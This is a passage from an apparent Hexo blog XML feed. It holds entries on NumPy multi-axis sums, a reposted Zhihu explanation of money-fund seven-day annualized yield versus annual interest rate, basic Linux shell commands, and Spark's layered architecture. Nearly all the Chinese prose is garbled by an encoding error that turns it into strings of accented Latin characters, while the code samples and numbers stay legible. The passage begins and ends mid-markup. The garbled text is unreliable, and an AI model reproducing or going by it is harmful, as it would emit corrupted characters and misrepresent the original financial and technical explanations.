class="number">0</span>,<span class="number">2</span>]</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><p>axisï¼(2,3)ï¼Œå››ç»´æ•°ç»„ï¼Œåœ¨ä¿è¯ä¸€äºŒç»´ä¸æ”¹å˜çš„æƒ…å†µä¸‹ï¼Œå°†ç¬¬ä¸‰ç¬¬å››ç»´çš„éƒ½åŠ èµ·æ¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.arange(<span class="number">24</span>).reshape((<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[[[ <span class="number">0</span>,  <span class="number">1</span>],</span><br><span class="line">         [ <span class="number">2</span>,  <span class="number">3</span>],</span><br><span class="line">         [ <span class="number">4</span>,  <span class="number">5</span>]],</span><br><span class="line"></span><br><span class="line">        [[ <span class="number">6</span>,  <span class="number">7</span>],</span><br><span class="line">         [ <span class="number">8</span>,  <span class="number">9</span>],</span><br><span class="line">         [<span class="number">10</span>, <span class="number">11</span>]]],</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       [[[<span class="number">12</span>, <span class="number">13</span>],</span><br><span class="line">         [<span class="number">14</span>, <span class="number">15</span>],</span><br><span class="line">         [<span class="number">16</span>, <span class="number">17</span>]],</span><br><span class="line"></span><br><span class="line">        [[<span class="number">18</span>, <span class="number">19</span>],</span><br><span class="line">         [<span class="number">20</span>, <span class="number">21</span>],</span><br><span class="line">         [<span class="number">22</span>, <span class="number">23</span>]]]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.<span class="built_in">sum</span>(a,axis=(<span class="number">2</span>,<span class="number">3</span>))</span><br><span class="line">array([[ <span class="number">15</span>,  <span class="number">51</span>],</span><br><span class="line">       [ <span class="number">87</span>, <span class="number">123</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.<span class="built_in">sum</span>(a,axis=(-<span class="number">1</span>,-<span class="number">2</span>))</span><br><span class="line">array([[ <span class="number">15</span>,  <span class="number">51</span>],</span><br><span class="line">       [ <span class="number">87</span>, <span class="number">123</span>]])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> numpy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»€ä¹ˆæ˜¯ä¸ƒå¤©å¹´åŒ–æ”¶ç›Šç‡å’Œå¹´åˆ©ç‡</title>
      <link href="/2022/03/02/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%83%E5%A4%A9%E5%B9%B4%E5%8C%96%E6%94%B6%E7%9B%8A%E7%8E%87%E5%92%8C%E5%B9%B4%E5%88%A9%E7%8E%87/"/>
      <url>/2022/03/02/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%83%E5%A4%A9%E5%B9%B4%E5%8C%96%E6%94%B6%E7%9B%8A%E7%8E%87%E5%92%8C%E5%B9%B4%E5%88%A9%E7%8E%87/</url>
      
        <content type="html"><![CDATA[<p>è°¢é‚€ä½œç­”ã€‚ç†è´¢å›å°±é¢˜ä¸»çš„æé—®ï¼Œç»“åˆå®ä¾‹å›ç­”ä¸€ä¸‹è¿™ä¸¤è€…çš„åŒºåˆ«ã€‚</p><p><strong>å›ç­”è¿™ä¸ªé—®é¢˜ä¹‹å‰ï¼Œè¦å…ˆæ¥ææ¸…æ¥š ã€Œ</strong><a href="https://www.zhihu.com/search?q=%E4%B8%83%E5%A4%A9%E5%B9%B4%E5%8C%96%E6%94%B6%E7%9B%8A%E7%8E%87&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:875128840%7D">ä¸ƒå¤©å¹´åŒ–æ”¶ç›Šç‡</a><strong>ã€å’Œã€Œå¹´åˆ©ç‡ã€ç©¶ç«Ÿæ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿ</strong></p><ul><li><strong>ã€Œä¸ƒå¤©å¹´åŒ–æ”¶ç›Šç‡ã€</strong></li></ul><p>æŒ‡å°†<a href="https://www.zhihu.com/search?q=%E8%B4%A7%E5%B8%81%E5%9F%BA%E9%87%91&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:875128840%7D">è´§å¸åŸºé‡‘</a>è¿‡å»7å¤©æ‰€è·çš„æ€»æ”¶ç›Šè¿›è¡Œå¹´åŒ–è®¡ç®—ä¹‹åå¾—å‡ºçš„æ•°æ®ã€‚å…·ä½“çš„æ“ä½œæ–¹æ³•æ˜¯å°†7å¤©çš„æ€»æ”¶ç›Šç‡é™¤ä»¥7ï¼Œå¾—åˆ°è¿‡å»7å¤©çš„å¹³å‡æ—¥æ”¶ç›Šç‡ï¼Œå†ä¹˜ä¸Š365å¤©ï¼Œå¾—åˆ°ä¸ƒæ—¥å¹´åŒ–æ”¶ç›Šç‡ã€‚<br><strong>å…¬å¼ï¼šä¸ƒæ—¥å¹´åŒ–æ”¶ç›Šç‡ = ä¸ƒæ—¥æ€»æ”¶ç›Šç‡ï¼ˆ%ï¼‰/ 7 x 365</strong></p><p>ä¸¾ä¸ªä¾‹å­ï¼ŒæŸè´§å¸åŸºé‡‘è¿‡å»7å¤©æ€»è·å¾—0.07%çš„æ”¶ç›Šç‡ï¼Œé‚£ä¹ˆè¿‡å»7å¤©æ¯å¤©å¹³å‡äº§ç”Ÿçš„æ”¶ç›Šç‡ä¸º0.01%ï¼ˆå³ä¸‡åˆ†ä¹‹ä¸€ï¼‰ï¼Œä¸ƒå¤©å¹´åŒ–æ”¶ç›Šç‡ä¹Ÿå°±æ˜¯3.65%ï¼ˆ0.07%/7x365ï¼‰</p><p>ä½œä¸ºä¸€ä¸ªç›´è§‚çš„æ”¶ç›ŠæŒ‡æ ‡ï¼Œä¸ƒå¤©å¹´åŒ–æ”¶ç›Šç‡æ˜¯æŠ•èµ„è€…é€‰æ‹©æŠ•èµ„åŸºé‡‘çš„é‡è¦æŒ‡æ ‡ï¼Œå¹³æ—¶å¤§å®¶çœ‹åˆ°çš„<a href="https://www.zhihu.com/search?q=%E5%AD%98%E6%AC%BE%E5%88%A9%E7%8E%87&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:875128840%7D">å­˜æ¬¾åˆ©ç‡</a>ã€ç†è´¢äº§å“ã€é€†å›è´­ç­‰é‡‘èäº§å“ä¹Ÿå¤šé‡‡ç”¨äº†å¹´åŒ–æ”¶ç›Šç‡ä½œä¸ºè®¡ä»·æ–¹å¼ã€‚</p><ul><li><strong>ã€Œå¹´åˆ©ç‡ã€</strong></li></ul><p>åˆ©ç‡ï¼Œæ˜¯æŒ‡ä¸€å®šæœŸé™å†…åˆ©æ¯é¢ä¸æœ¬é‡‘çš„æ¯”ç‡ï¼Œä¸€èˆ¬åˆ†ä¸ºå¹´åˆ©ç‡ã€æœˆåˆ©ç‡å’Œæ—¥åˆ©ç‡ä¸‰ç§ã€‚</p><p>è€Œ<strong>å¹´åˆ©ç‡å°±æ˜¯æŒ‡ä»¥ä¸€å¹´ï¼ˆ365å¤©ï¼‰ä¸ºè®¡æ¯å‘¨æœŸè®¡ç®—çš„åˆ©æ¯é¢ä¸æœ¬é‡‘çš„æ¯”ç‡ã€‚</strong></p><p><strong>å…¬å¼ï¼šå¹´åˆ©ç‡ = <strong><a href="https://www.zhihu.com/search?q=%E4%B8%80%E5%B9%B4%E6%9C%9F%E5%88%A9%E6%81%AF&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:875128840%7D">ä¸€å¹´æœŸåˆ©æ¯</a></strong> Ã· æœ¬é‡‘ Ã— 100%</strong></p><p>å†ä¸¾ä¸ªä¾‹å­ï¼Œå°æ˜å°†100å…ƒçš„æœ¬é‡‘å­˜å…¥é“¶è¡Œï¼Œè‹¥XXé“¶è¡Œç­”åº”çš„å¹´åˆ©ç‡ä¸º3.5%ï¼Œé‚£ä¹ˆä¸€å¹´ä¹‹åé™¤äº†æœ¬é‡‘ä¹‹å¤–ï¼Œå°æ˜å¯ä»¥è·å¾—3.5å…ƒçš„åˆ©æ¯ã€‚</p><p><strong>åœ¨ææ¸…æ¥šå®ƒä»¬çš„æ¦‚å¿µä¹‹åï¼Œã€Œä¸ƒå¤©å¹´åŒ–æ”¶ç›Šç‡ã€å’Œã€Œå¹´åˆ©ç‡ã€æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿ</strong></p><p>å¯¹äºæŠ•èµ„è€…è€Œè¨€ï¼Œå®ƒä»¬æœ€å¤§çš„åŒºåˆ«å°±åœ¨äºï¼Œ åœ¨ä¸€å¹´ä¹‹ä¸­å¹´åˆ©ç‡æ˜¯â€œæ‰€è§å³æ‰€å¾—â€çš„ ï¼Œè€Œä¸ƒå¤©å¹´åŒ–æ”¶ç›Šç‡åˆ™æ˜¯â€œæ‰€è§å¹¶éæ‰€å¾—â€ã€‚</p><p>å¹´åˆ©ç‡åœ¨ä¸€å¹´ä¹‹ä¸­æ˜¯å›ºå®šä¸å˜çš„ï¼Œä¹Ÿå°±æ˜¯æ‰€è§å³æ‰€å¾—ã€‚å³æŠ•èµ„è€…åœ¨æŠ•å…¥æœ¬é‡‘æ—¶çœ‹åˆ°çš„å¹´åˆ©ç‡ï¼Œä¹Ÿå°±æ˜¯å…¶ä¸€å¹´åæ‰€è·çš„æ”¶ç›Šã€‚</p><p>è€Œå¯¹ä¸ƒå¤©å¹´åŒ–æ”¶ç›Šç‡è€Œè¨€ï¼Œå®ƒçš„ç¼ºç‚¹å°±æ˜¯æ‰€è§å¹¶éæ‰€å¾—ã€‚å³<a href="https://www.zhihu.com/search?q=%E4%B8%83%E6%97%A5%E5%B9%B4%E5%8C%96%E6%94%B6%E7%9B%8A%E7%8E%87&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:875128840%7D">ä¸ƒæ—¥å¹´åŒ–æ”¶ç›Šç‡</a>å¹¶éç­‰äºå®é™…æ”¶ç›Šã€‚</p><p>ä¸ƒå¤©å¹´åŒ–æ”¶ç›Šç‡æ˜¯æŠŠåŸºé‡‘è¿‡å»7å¤©çš„æ”¶ç›Šç‡è€ƒè™‘åœ¨å†…ï¼Œå¹¶è¿›è¡Œå¹´åŒ–ä»¥åç®—å‡ºçš„æŒ‡æ ‡ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œè‹¥å°æ˜æŠ•èµ„çš„XXåŸºé‡‘æ˜¾ç¤ºå½“æ—¥è¯¥åŸºé‡‘çš„ä¸ƒå¤©å¹´åŒ–æ”¶ç›Šç‡ä¸º3.5%ï¼Œå‡è®¾ä¹‹åæ•´å¹´æ”¶ç›Šç‡æŒ‰ç…§è¿™ä¸€æ ‡å‡†ä¸å˜ï¼Œé‚£ä¹ˆå°æ˜è·å¾—çš„æ•´å¹´æ”¶ç›Šä¹Ÿæ˜¯3.5%ã€‚</p><p>é€šè¿‡è¿™ç§æ–¹æ³•è®¡ç®—å¾—å‡ºçš„ä¸ƒå¤©å¹´åŒ–æ”¶ç›Šç‡ï¼Œå­˜åœ¨è¿™æ ·ä¸€ä¸ªç¼ºç‚¹â€”â€”æ¯æ—¥å®é™…æ”¶ç›Šæ°´å¹³å¯èƒ½ä¼šä½äºæˆ–é«˜äºå¹³å‡æ”¶ç›Šæ°´å¹³ã€‚</p><p>åœ¨è¿™7å¤©å†…è‹¥æŸä¸€æ—¥çš„å•æ—¥æ”¶ç›Šç‰¹åˆ«é«˜ï¼Œä¼šä½¿å¾—è¿™ä¸€æ—¥å‰å7å¤©å‘ˆç°å‡ºä¸€ä¸ªéå¸¸é«˜çš„ä¸ƒæ—¥å¹´åŒ–æ”¶ç›Šç‡ã€‚ä¹Ÿå°±æ˜¯è¯´è‹¥æŠ•èµ„è€…åœ¨é‡Šæ”¾æ”¶ç›Šè¿™å¤©ä¹‹åä¹°å…¥ï¼Œåç»­å‡ å¤©è™½ç„¶çœ‹èµ·æ¥ä¸ƒæ—¥å¹´åŒ–æ”¶ç›Šç‡å¾ˆé«˜ï¼Œä½†å®é™…è¿›å…¥æŠ•èµ„è€…å£è¢‹çš„æ”¶ç›Šå´æœ‰å¯èƒ½éå¸¸ä¸€èˆ¬ã€‚<br><img src="https://snowgo.top/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%83%E5%A4%A9%E5%B9%B4%E5%8C%96%E6%94%B6%E7%9B%8A%E7%8E%87%E5%92%8C%E5%B9%B4%E5%88%A9%E7%8E%87/0.png"><br><strong>é‚£ä¹ˆå¯¹äºã€Œä¸ƒå¤©å¹´åŒ–æ”¶ç›Šç‡ã€çš„è¿™ä¸ªç¼ºç‚¹è¯¥å¦‚ä½•å¼¥è¡¥å‘¢ï¼Ÿ</strong></p><p>è¿™æ—¶å€™å°±ä¸å¾—ä¸æèµ·å®ƒçš„é»„é‡‘æ­æ¡£ã€Œæ¯ä¸‡ä»½æ”¶ç›Šã€äº†ã€‚</p><p>æ¯ä¸‡ä»½æ”¶ç›ŠæŒ‡çš„æ˜¯æ¯ä¸€ä¸‡ä»½è´§å¸åŸºé‡‘æ¯å¤©äº§ç”Ÿå¤šå°‘æ”¶ç›Šï¼Œå³è´§å¸åŸºé‡‘æŒæœ‰äººæ¯å¤©èƒ½å¤Ÿ<strong>çœŸå®å¾—åˆ°çš„æ”¶ç›Šã€‚</strong></p><p>ä¸¾ä¸ªä¾‹å­ï¼Œå‡å¦‚æŸåªè´§å¸åŸºé‡‘çš„æ¯ä¸‡ä»½æ”¶ç›Šæ˜¯1å…ƒï¼Œå°±æ˜¯è¯´æŠ•èµ„è€…æŒæœ‰1ä¸‡ä»½è¯¥è´§å¸åŸºé‡‘ï¼Œæ¯å¤©èƒ½å¤Ÿè·å–1å…ƒçš„æ”¶ç›Šï¼ŒæŒ‰å•æ—¥å¹´åŒ–å…¶å®å°±æ˜¯3.65%ï¼ˆå› ä¸ºæ¯ä¸‡ä»½æ”¶ç›Š1å…ƒï¼Œå³æ¯å¤©äº§ç”Ÿ0.01%çš„æ”¶ç›Šï¼Œç»è¿‡ä¸€å¹´365å¤©å¹´åŒ–åçš„æ”¶ç›Šç‡å³ä¸º3.65%ï¼‰ã€‚</p><p>å®é™…ä¸Šï¼Œä¸ƒæ—¥å¹´åŒ–æ”¶ç›Šç‡æ˜¯å¯¹æ¯ä¸‡ä»½æ”¶ç›Šçš„ä¸€ä¸ªå¹³æ»‘å¤„ç†ï¼ŒäºŒè€…ç›¸è¾…ç›¸æˆï¼Œæ”¾åœ¨ä¸€èµ·å°±èƒ½å¤Ÿæ¯”è¾ƒå…¨é¢çš„è€ƒå¯Ÿä¸€ä¸ªè´§å¸åŸºé‡‘çš„çŸ­æœŸä¸šç»©æƒ…å†µã€‚è‹¥è¦çœ‹é•¿æœŸä¸šç»©ï¼Œå½“ç„¶è¿˜æ˜¯å¯ä»¥çœ‹ä»Šå¹´ä»¥æ¥ï¼Œè¿‘ä¸€å¹´ï¼Œè¿‘åŠå¹´è¿™æ ·çš„é•¿æœŸæŒ‡æ ‡ã€‚</p><p>æƒ³è¦äº†è§£ä¸ƒæ—¥å¹´åŒ–æ”¶ç›Šå’Œæ¯ä¸‡ä»½æ”¶ç›Šæœ‰ä½•ä¸åŒä¹ˆï¼Ÿ<br>æƒ³çŸ¥é“è´§å¸åŸºé‡‘ç©¶ç«Ÿæ˜¯å¦‚ä½•ä¼°å€¼çš„ï¼Ÿ<br><a href="https://zhuanlan.zhihu.com/p/86092605">ç‚¹å‡»æ–‡ç« é“¾æ¥ï¼Œäº†è§£æ›´å¤šï¼</a><br>â€‹</p><blockquote><p>ä½œè€…ï¼šè…¾è®¯ç†è´¢é€š<br>é“¾æ¥ï¼š<a href="https://www.zhihu.com/question/22688887/answer/875128840">https://www.zhihu.com/question/22688887/answer/875128840</a><br>æ¥æºï¼šçŸ¥ä¹<br>è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ç†è´¢ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ”¶ç›ŠæŒ‡æ ‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxå®æˆ˜100è®²</title>
      <link href="/2022/02/22/Linux%E5%AE%9E%E6%88%98100%E8%AE%B2/"/>
      <url>/2022/02/22/Linux%E5%AE%9E%E6%88%98100%E8%AE%B2/</url>
      
        <content type="html"><![CDATA[<h2 id="å¸®åŠ©å‘½ä»¤"><a href="#å¸®åŠ©å‘½ä»¤" class="headerlink" title="å¸®åŠ©å‘½ä»¤"></a>å¸®åŠ©å‘½ä»¤</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">man -a ls  #æŸ¥æ‰¾æ‰€æœ‰ç« èŠ‚</span><br><span class="line">help cd</span><br><span class="line">ls --help</span><br></pre></td></tr></table></figure><p>æŒ‰qé€€å‡º<br>â€‹</p><p>â€‹</p><h2 id="ä¸€äº›çš†æ–‡ä»¶"><a href="#ä¸€äº›çš†æ–‡ä»¶" class="headerlink" title="ä¸€äº›çš†æ–‡ä»¶"></a>ä¸€äº›çš†æ–‡ä»¶</h2><h3 id="æ˜¾ç¤ºå½“å‰çš„ç›®å½•åç§°"><a href="#æ˜¾ç¤ºå½“å‰çš„ç›®å½•åç§°" class="headerlink" title="æ˜¾ç¤ºå½“å‰çš„ç›®å½•åç§°"></a>æ˜¾ç¤ºå½“å‰çš„ç›®å½•åç§°</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure><h3 id="æ›´æ”¹å½“å‰çš„æ“ä½œç›®å½•"><a href="#æ›´æ”¹å½“å‰çš„æ“ä½œç›®å½•" class="headerlink" title="æ›´æ”¹å½“å‰çš„æ“ä½œç›®å½•"></a>æ›´æ”¹å½“å‰çš„æ“ä½œç›®å½•</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /path/to/....ç»å¯¹è·¯å¾„ </span><br><span class="line">cd ./path/to/...ç›¸å¯¹è·¯å¾„  å’Œä¸å†™./ä¸€æ ·çš„æ•ˆæœ</span><br><span class="line">cd ../path/to/...ç›¸å¯¹è·¯å¾„ æŒ‡çš„æ˜¯ä¸Šçº§ç›®å½•ä¸‹</span><br></pre></td></tr></table></figure><h3 id="æ–‡ä»¶æŸ¥çœ‹"><a href="#æ–‡ä»¶æŸ¥çœ‹" class="headerlink" title="æ–‡ä»¶æŸ¥çœ‹"></a>æ–‡ä»¶æŸ¥çœ‹</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls -l é•¿æ ¼å¼æ˜¾ç¤ºæ–‡ä»¶</span><br><span class="line">   -a æ˜¾ç¤ºéšè—æ–‡ä»¶</span><br><span class="line">   -ré€†åºæ˜¾ç¤º</span><br><span class="line">   -t æŒ‰ç…§æ—¶é—´é¡ºåºæ˜¾ç¤º</span><br><span class="line">   -R é€’å½’æ˜¾ç¤º</span><br></pre></td></tr></table></figure><h3 id="é™„ï¼šåˆ‡æ¢ä¸ºrootç”¨æˆ·"><a href="#é™„ï¼šåˆ‡æ¢ä¸ºrootç”¨æˆ·" class="headerlink" title="é™„ï¼šåˆ‡æ¢ä¸ºrootç”¨æˆ·"></a>é™„ï¼šåˆ‡æ¢ä¸ºrootç”¨æˆ·</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su - root</span><br></pre></td></tr></table></figure><p>ä¹‹åæ¯ä¸€è¡Œæœ«å°¾ä¼šå˜æˆâ€˜#â€™<br>â€‹</p>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯æ ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ•´ä½“æ¶æ„</title>
      <link href="/2022/02/16/%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/"/>
      <url>/2022/02/16/%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h2 id="é¦–å…ˆäº†è§£ä¸€ä¸‹å¤§æ•°æ®å¤„ç†æ¡†æ¶çš„å››å±‚ç»“æ„"><a href="#é¦–å…ˆäº†è§£ä¸€ä¸‹å¤§æ•°æ®å¤„ç†æ¡†æ¶çš„å››å±‚ç»“æ„" class="headerlink" title="é¦–å…ˆäº†è§£ä¸€ä¸‹å¤§æ•°æ®å¤„ç†æ¡†æ¶çš„å››å±‚ç»“æ„"></a>é¦–å…ˆäº†è§£ä¸€ä¸‹å¤§æ•°æ®å¤„ç†æ¡†æ¶çš„å››å±‚ç»“æ„</h2><p><img src="https://snowgo.top/medias/medias/%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/0.png"><br><strong>æ³¨æ„ï¼šä¸Šå›¾ä½“ç°äº†rddå’Œtaskçš„å…³ç³»</strong><br><img src="https://snowgo.top/medias/medias/%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/1.png"></p><ul><li><strong>ä¸Šå›¾æ‰€ç¤ºï¼Œå³å¤§æ•°æ®å¤„ç†æ¡†æ¶å››å±‚ç»“æ„ï¼Œä¸‹é¢å°†é€ä¸€ä»‹ç»</strong></li></ul><h3 id="ç”¨æˆ·å±‚"><a href="#ç”¨æˆ·å±‚" class="headerlink" title="ç”¨æˆ·å±‚"></a>ç”¨æˆ·å±‚</h3><ul><li><strong>è¿™ä¸€å±‚ä¸»è¦æ˜¯å‡†å¤‡è¾“å…¥æ•°æ®ã€Sparkæˆ–Hadoopçš„ç”¨æˆ·ä»£ç ã€é…ç½®å‚æ•°</strong><ul><li><strong>è¾“å…¥æ•°æ®ï¼šä¸€èˆ¬ä»¥åˆ†å—å½¢å¼å­˜åœ¨HDFSæˆ–è€…Hbaseæˆ–æ•°æ®åº“ä¸­</strong></li><li><strong>ç”¨æˆ·ä»£ç ï¼šè¿™é‡Œéœ€è¦äº†è§£çš„æ˜¯ï¼Œç¼–å†™ä»£ç åä¼šç”Ÿæˆä¸€ä¸ªDriverç¨‹åºï¼Œå°†ä»£ç æäº¤ç»™é›†ç¾¤è¿è¡Œï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæäº¤Sparkä»£ç åï¼Œç”Ÿæˆçš„Driverç¨‹åºå¯ä»¥å¹¿æ’­æ•°æ®ç»™å„ä¸ªtaskï¼Œå¹¶ä¸”æ”¶é›†taskçš„è¿è¡Œç»“æœ</strong></li></ul></li></ul><p><img src="https://snowgo.top/medias/medias/%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/2.png"></p><ul><li><strong>é…ç½®å‚æ•°ï¼šä¸€ç§æ˜¯èµ„æºéœ€æ±‚å‚æ•°å¦‚èµ„æºå®¹å™¨æ•°å’ŒCpuå¤§å°ç­‰ï¼Œå¦ä¸€ç§æ˜¯æ•°æ®æµå‚æ•°å¦‚æ•°æ®åˆ†ç‰‡å¤§å°å’Œåˆ†ç‰‡ä¸ªæ•°ç­‰è§å››å±‚ç»“æ„å›¾å³å¯</strong></li></ul><h3 id="åˆ†å¸ƒå¼æ•°æ®å¹¶è¡Œå¤„ç†å±‚"><a href="#åˆ†å¸ƒå¼æ•°æ®å¹¶è¡Œå¤„ç†å±‚" class="headerlink" title="åˆ†å¸ƒå¼æ•°æ®å¹¶è¡Œå¤„ç†å±‚"></a>åˆ†å¸ƒå¼æ•°æ®å¹¶è¡Œå¤„ç†å±‚</h3><ul><li><strong>è¿™ä¸€å±‚æ˜¯æŠŠç”¨æˆ·æäº¤çš„åº”ç”¨è½¬åŒ–ä¸ºè®¡ç®—ä»»åŠ¡ï¼Œç„¶åè°ƒç”¨ä¸‹ä¸€å±‚(èµ„æºç®¡ç†ä¸ä»»åŠ¡è°ƒåº¦å±‚)å®ç°å¹¶è¡Œæ‰§è¡Œ</strong><ul><li><strong>è½¬åŒ–è¿‡ç¨‹ï¼šMapReduceç›´æ¥å°±map-shuffle-reduceï¼Œä½†æ˜¯Sparkä¸ä¸€æ ·ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º</strong></li></ul><ol><li><strong>Sparké¦–å…ˆè¦æŠŠSparkä»£ç è½¬åŒ–ä¸ºé€»è¾‘å¤„ç†æµç¨‹ï¼Œæ•°æ®å¤„ç†æµç¨‹åŒ…æ‹¬æ•°æ®å•å…ƒRDDå’Œæ•°æ®ä¾èµ–å…³ç³»ï¼Œå›¾ä¸­æ¯ä¸ªæ•°æ®å•å…ƒRDDé‡Œçš„åœ†å½¢æ˜¯RDDçš„å¤šä¸ªæ•°æ®åˆ†ç‰‡ï¼Œæ­£æ–¹å½¢æŒ‡çš„æ˜¯è¾“å…¥æ•°æ®åˆ†ç‰‡</strong></li><li><strong>ç„¶åå¦‚å›¾å¯¹é€»è¾‘å¤„ç†æµç¨‹è¿›è¡Œåˆ’åˆ†ï¼Œç”Ÿæˆç‰©ç†æ‰§è¡Œè®¡åˆ’ï¼ŒåŒ…å«å¤šä¸ªstageï¼Œæ¯ä¸ªstageåŒ…å«å¤šä¸ªtaskï¼Œtaskä¸ªæ•°ä¸€èˆ¬å°±æ˜¯RDDä¸­æ•°æ®åˆ†ç‰‡çš„ä¸ªæ•°</strong><br><img src="https://snowgo.top/medias/medias/%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/3.png"></li></ol></li></ul><h3 id="èµ„æºç®¡ç†ä¸ä»»åŠ¡è°ƒåº¦å±‚"><a href="#èµ„æºç®¡ç†ä¸ä»»åŠ¡è°ƒåº¦å±‚" class="headerlink" title="èµ„æºç®¡ç†ä¸ä»»åŠ¡è°ƒåº¦å±‚"></a>èµ„æºç®¡ç†ä¸ä»»åŠ¡è°ƒåº¦å±‚</h3><ul><li><strong>è¿™ä¸€å±‚å°±æ˜¯èµ„æºç®¡ç†å’Œä»»åŠ¡è°ƒåº¦ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º</strong></li><li><strong>å¯¹äºèµ„æºç®¡ç†æ¥è¯´ï¼ŒSparkéƒ¨ç½²æ¨¡å¼ä¸åŒè¿™ä¸€å±‚çš„å·¥ä½œå°±ä¸åŒ</strong><ul><li><strong>è¿™é‡Œä»…ä»‹ç»Sparkçš„Standaloneæ¨¡å¼ï¼Œå…¶ä»–æ¨¡å¼åé¢ç« èŠ‚ä¼šè¯¦ç»†ä»‹ç»</strong></li><li><strong>Standaloneæ¨¡å¼ç±»ä¼¼äºMapReduceã€‚åŒºåˆ«åœ¨äºMapReduceä¸ºæ¯ä¸ªtaskå°†è¦è¿è¡Œæ—¶å¯åŠ¨ä¸€ä¸ªJVMè¿›ç¨‹ï¼Œè€ŒSparkæ˜¯é¢„å…ˆå¯åŠ¨èµ„æºå®¹å™¨(Executor JVM)ï¼Œç„¶ååœ¨taskæ‰§è¡Œæ—¶åœ¨JVMä¸­å¯åŠ¨taskçº¿ç¨‹</strong></li></ul></li><li><strong>ä»»åŠ¡è°ƒåº¦æœ‰ä¸¤ç§è°ƒåº¦å™¨ï¼šä¸€ç§æ˜¯ä½œä¸šè°ƒåº¦å™¨ï¼šå†³å®šå¤šä¸ªä½œä¸šæ‰§è¡Œé¡ºåºï¼›ä¸€ç§æ˜¯ä»»åŠ¡è°ƒåº¦å™¨ï¼Œå†³å®šå¤šä¸ªtaskæ‰§è¡Œé¡ºåºã€‚ä¸‹å›¾æ‰€ç¤ºçš„æ˜¯å…ˆè¿›å…ˆå‡ºçš„ä»»åŠ¡è°ƒåº¦å™¨</strong><br><img src="https://snowgo.top/medias/medias/%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84/4.png"></li></ul><h3 id="ç‰©ç†æ‰§è¡Œå±‚"><a href="#ç‰©ç†æ‰§è¡Œå±‚" class="headerlink" 